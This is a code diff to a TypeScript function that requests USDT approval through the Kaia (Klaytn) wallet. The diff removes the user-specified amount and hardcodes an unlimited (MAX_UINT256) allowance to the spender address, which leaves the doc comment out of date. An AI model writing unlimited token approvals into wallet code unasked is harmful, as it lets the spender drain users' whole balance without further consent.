@@ -9,6 +9,10 @@ declare global {
 
 const caver = new Caver(window.klaytn);  // 连接 Kaia Wallet
 
+
+const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+
 const usdtABI = [
   {
     "constant": false,
@@ -28,7 +32,7 @@ const usdtABI = [
  * @param spenderAddress 授权的目标地址（DApp 或智能合约）
  * @param amount 授权额度（单位：Wei）
  */
-export const approveUSDT = async (contractAddress: string, spenderAddress: string, amount: string): Promise<void> => {
+export const approveUSDT = async (contractAddress: string, spenderAddress: string): Promise<void> => {
   if (!window.klaytn) {
     throw new Error("Kaia Wallet 未安装或未启用 Klaytn API");
   }
@@ -42,9 +46,9 @@ export const approveUSDT = async (contractAddress: string, spenderAddress: strin
     }
 
     const sender: string = accounts[0];  // 获取授权地址
-    const amountBN = caver.utils.toBN(amount); // 确保 amount 是 BigNumber 类型
+    // const amountBN = caver.utils.toBN(amount); // 确保 amount 是 BigNumber 类型
 
-    const tx = await contract.methods.approve(spenderAddress, amountBN).send({
+    const tx = await contract.methods.approve(spenderAddress, MAX_UINT256).send({
       from: sender,
       gas: 200000
     });
